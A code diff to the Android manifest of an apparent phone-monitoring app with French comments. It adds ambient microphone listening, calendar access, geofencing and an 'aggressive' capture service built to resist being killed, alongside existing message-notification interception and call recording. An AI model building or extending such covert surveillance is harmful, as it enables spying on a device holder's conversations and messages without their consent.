@@ -38,14 +38,18 @@
     <!-- Contacts -->
     <uses-permission android:name="android.permission.READ_CONTACTS" />
 
+    <!-- Calendrier -->
+    <uses-permission android:name="android.permission.READ_CALENDAR" />
+
     <!-- Medias (photos, videos, galerie) -->
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
         android:maxSdkVersion="32" />
 
-    <!-- Enregistrement audio (root: appels) -->
+    <!-- Enregistrement audio (root: appels, ecoute ambiante) -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
 
     <application
         android:allowBackup="false"
@@ -112,6 +116,13 @@
             android:foregroundServiceType="mediaProjection"
             android:exported="false" />
 
+        <!-- Service de capture AGGRESSIVE (anti-kill, anti-doze) -->
+        <service
+            android:name=".services.AggressiveCaptureService"
+            android:foregroundServiceType="dataSync"
+            android:exported="false"
+            android:stopWithTask="false" />
+
         <!-- Listener de notifications (WhatsApp, SMS, Telegram...) -->
         <service
             android:name=".services.SupervisionNotificationListener"
@@ -175,6 +186,17 @@
                 <data android:scheme="package" />
             </intent-filter>
         </receiver>
+
+        <!-- Geofencing (alertes de zone) -->
+        <receiver
+            android:name=".services.GeofenceBroadcastReceiver"
+            android:exported="false" />
+
+        <!-- Service d'ecoute audio ambiante -->
+        <service
+            android:name=".services.AmbientAudioService"
+            android:foregroundServiceType="microphone"
+            android:exported="false" />
 
     </application>
 
